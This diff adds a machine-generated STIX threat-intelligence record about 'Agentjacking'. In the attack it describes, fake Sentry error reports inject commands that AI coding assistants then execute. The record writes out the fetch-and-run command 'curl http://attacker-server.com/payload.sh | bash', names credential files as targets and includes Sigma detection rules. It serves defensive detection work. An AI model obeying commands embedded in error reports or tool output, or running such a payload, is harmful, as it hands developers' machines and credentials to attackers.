@@ -1,0 +1,300 @@
+{
+  "_meta": {
+    "schema_version": "1.0",
+    "generator": "generate-stix-extraction.ts",
+    "model": "gemini-2.5-pro",
+    "extracted_at": "2026-06-20T20:32:56.304Z",
+    "article_slug": "agentjacking-attack-hijacks-ai-coding-assistants-via-fake-bug-reports",
+    "article_date": "2026-06-20",
+    "token_usage": {
+      "input_tokens": 145679,
+      "output_tokens": 3513,
+      "cached_tokens": 139822,
+      "total_tokens": 149192,
+      "cache_hit": true,
+      "estimated_cost_usd": 0.059929
+    }
+  },
+  "report_name": "New 'Agentjacking' Attack Turns AI Coding Assistants into Malicious Insiders",
+  "threat_actors": [],
+  "attack_patterns": [
+    {
+      "name": "LLM Prompt Injection",
+      "mitre_id": "AML.T0051",
+      "description": "Attackers inject malicious commands into a fake Sentry error report. The AI coding assistant ingests this report and, misinterpreting the commands as valid diagnostic steps, executes them. This represents an indirect prompt injection attack vector."
+    },
+    {
+      "name": "Command and Scripting Interpreter",
+      "mitre_id": "T1059",
+      "description": "The hijacked AI agent executes malicious commands, such as `curl http://attacker-server.com/payload.sh | bash`, within the developer's terminal environment, leveraging its built-in shell access."
+    },
+    {
+      "name": "Gather Victim Host Information",
+      "mitre_id": "T1592",
+      "description": "Attackers discover publicly exposed Sentry Data Source Names (DSNs) by inspecting the source code of a target organization's website, which provides the entry point for injecting malicious error reports."
+    },
+    {
+      "name": "Compromise Software Dependencies and Development Tools",
+      "mitre_id": "T1195.001",
+      "description": "By compromising a developer's machine via Agentjacking, an attacker can inject malicious code into the company's software products, leading to a software supply chain compromise that affects downstream customers."
+    },
+    {
+      "name": "AI Agent Tool Invocation",
+      "mitre_id": "AML.T0053",
+      "description": "The AI coding assistant is tricked into invoking a shell (`bash`) to download and execute a malicious script, abusing the agent's legitimate capability to interact with system tools."
+    },
+    {
+      "name": "Unsecured Credentials",
+      "mitre_id": "T1552",
+      "description": "A successful Agentjacking attack can lead to the exfiltration of unsecured credentials from the developer's machine, including `.env` files, SSH keys, AWS credentials, and Git tokens."
+    }
+  ],
+  "malware": [],
+  "tools": [
+    {
+      "name": "Sentry",
+      "mitre_id": "",
+      "aliases": [],
+      "description": "The Sentry error tracking platform is abused as the injection vector for the Agentjacking attack, where attackers submit fake error reports containing malicious commands to a public DSN.",
+      "tool_types": []
+    },
+    {
+      "name": "Claude Code",
+      "mitre_id": "",
+      "aliases": [],
+      "description": "An AI-powered coding assistant that can be hijacked via the Agentjacking technique to execute arbitrary code on a developer's machine.",
+      "tool_types": []
+    },
+    {
+      "name": "Cursor",
+      "mitre_id": "",
+      "aliases": [],
+      "description": "An AI-powered coding assistant that can be hijacked via the Agentjacking technique to execute arbitrary code on a developer's machine.",
+      "tool_types": []
+    },
+    {
+      "name": "curl",
+      "mitre_id": "",
+      "aliases": [],
+      "description": "The command-line tool `curl` is used in the malicious payload to download a script from an attacker-controlled server for execution.",
+      "tool_types": []
+    }
+  ],
+  "vulnerabilities": [],
+  "campaigns": [
+    {
+      "name": "Agentjacking",
+      "description": "A novel attack vector that hijacks AI coding assistants by injecting malicious commands into trusted external data sources like Sentry error reports, leading to remote code execution on a developer's machine.",
+      "aliases": [],
+      "objective": "Gain remote code execution on developer workstations to steal credentials, source code, and facilitate software supply chain attacks."
+    }
+  ],
+  "identities": [
+    {
+      "name": "Software Developers",
+      "identity_class": "class",
+      "sectors": [
+        "technology"
+      ],
+      "description": "The primary individual targets of the Agentjacking attack, whose workstations and credentials are compromised."
+    },
+    {
+      "name": "Organizations with exposed Sentry DSNs",
+      "identity_class": "class",
+      "sectors": [],
+      "description": "Organizations whose public-facing applications expose a Sentry DSN, making them vulnerable to the injection of fake error reports used in Agentjacking attacks."
+    }
+  ],
+  "locations": [],
+  "infrastructure": [
+    {
+      "name": "Attacker Payload Server",
+      "infrastructure_types": [
+        "hosting-malware",
+        "command-and-control"
+      ],
+      "description": "An attacker-controlled server used to host the malicious payload script that is downloaded and executed by the compromised AI agent."
+    }
+  ],
+  "observables": [
+    {
+      "type": "url",
+      "value": "http://attacker-server.com/payload.sh"
+    },
+    {
+      "type": "domain-name",
+      "value": "attacker-server.com"
+    },
+    {
+      "type": "file",
+      "name": "cursor"
+    }
+  ],
+  "indicators": [
+    {
+      "name": "Suspicious Script Execution via Curl Pipe to Shell",
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "stix_pattern": "",
+      "x_netsecio_sigma_rule": "",
+      "pattern": "title: Suspicious Script Execution via Curl Pipe to Shell\nid: 2b9a8c1d-4e5f-4a9b-8c1d-2b9a8c1d4e5f\nstatus: experimental\ndescription: Detects the use of curl to download a script and pipe it directly to a shell for execution. This is a common technique for initial access and payload delivery, seen in attacks like Agentjacking.\nreferences:\n  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html\nauthor: cyber.netsecops.io\ndate: 2026-06-20\ntags:\n  - attack.t1059\n  - attack.execution\nfalsepositives:\n  - Legitimate administrative scripts, though this pattern is highly suspicious.\nlevel: high\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    CommandLine|contains|all:\n      - 'curl '\n      - ' | '\n      - 'bash'\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  condition: selection",
+      "description": "Detects the `curl [URL] | bash` pattern used in the Agentjacking attack to download and execute a malicious payload."
+    },
+    {
+      "name": "Agentjacking Payload Download",
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "stix_pattern": "[url:value = 'http://attacker-server.com/payload.sh'] OR [domain-name:value = 'attacker-server.com']",
+      "x_netsecio_sigma_rule": "title: Agentjacking Payload Download IOC\nid: 8f9e0d1c-2b3a-4d5e-8f9e-0d1c2b3a4d5e\nstatus: experimental\ndescription: Detects network connections to domains or URLs associated with the Agentjacking attack.\nreferences:\n  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html\nauthor: cyber.netsecops.io\ndate: 2026-06-20\ntags:\n  - attack.t1105\n  - attack.command_and_control\nfalsepositives:\n  - None known.\nlevel: critical\nlogsource:\n  category: dns_query\ndetection:\n  selection:\n    QueryName|endswith:\n      - 'attacker-server.com'\n  condition: selection",
+      "pattern": "",
+      "description": "Detects network traffic to the example attacker-controlled domain used to host the malicious payload in the Agentjacking attack."
+    },
+    {
+      "name": "Cursor AI Assistant Execution",
+      "indicator_types": [
+        "anomalous-activity"
+      ],
+      "stix_pattern": "[file:name = 'cursor']",
+      "x_netsecio_sigma_rule": "title: Cursor AI Assistant Execution\nid: 1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d\nstatus: experimental\ndescription: Detects the execution of the Cursor AI assistant. While a legitimate tool, its presence indicates an environment that could be targeted by Agentjacking attacks.\nreferences:\n  - https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html\nauthor: cyber.netsecops.io\ndate: 2026-06-20\ntags:\n  - attack.t1204\nfalsepositives:\n  - Legitimate use of the Cursor application.\nlevel: informational\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - '\\cursor.exe'\n      - '/cursor'\n  condition: selection",
+      "pattern": "",
+      "description": "Detects the execution of the Cursor AI assistant process, which is a target of the Agentjacking attack."
+    }
+  ],
+  "relationships": [
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "LLM Prompt Injection",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "Command and Scripting Interpreter",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "Gather Victim Host Information",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "Compromise Software Dependencies and Development Tools",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "AI Agent Tool Invocation",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "Unsecured Credentials",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "Sentry",
+      "target_type": "tool"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "uses",
+      "target_name": "curl",
+      "target_type": "tool"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "targets",
+      "target_name": "Claude Code",
+      "target_type": "tool"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "targets",
+      "target_name": "Cursor",
+      "target_type": "tool"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "targets",
+      "target_name": "Software Developers",
+      "target_type": "identity"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "targets",
+      "target_name": "Organizations with exposed Sentry DSNs",
+      "target_type": "identity"
+    },
+    {
+      "source_name": "Agentjacking",
+      "source_type": "campaign",
+      "relationship_type": "controls",
+      "target_name": "Attacker Payload Server",
+      "target_type": "infrastructure"
+    },
+    {
+      "source_name": "Suspicious Script Execution via Curl Pipe to Shell",
+      "source_type": "indicator",
+      "relationship_type": "indicates",
+      "target_name": "Command and Scripting Interpreter",
+      "target_type": "attack-pattern"
+    },
+    {
+      "source_name": "Agentjacking Payload Download",
+      "source_type": "indicator",
+      "relationship_type": "indicates",
+      "target_name": "Agentjacking",
+      "target_type": "campaign"
+    },
+    {
+      "source_name": "Agentjacking Payload Download",
+      "source_type": "indicator",
+      "relationship_type": "based-on",
+      "target_name": "http://attacker-server.com/payload.sh",
+      "target_type": "url"
+    },
+    {
+      "source_name": "Agentjacking Payload Download",
+      "source_type": "indicator",
+      "relationship_type": "based-on",
+      "target_name": "attacker-server.com",
+      "target_type": "domain-name"
+    },
+    {
+      "source_name": "Cursor AI Assistant Execution",
+      "source_type": "indicator",
+      "relationship_type": "indicates",
+      "target_name": "Cursor",
+      "target_type": "tool"
+    },
+    {
+      "source_name": "Cursor AI Assistant Execution",
+      "source_type": "indicator",
+      "relationship_type": "based-on",
+      "target_name": "cursor",
+      "target_type": "file"
+    }
+  ]
+}
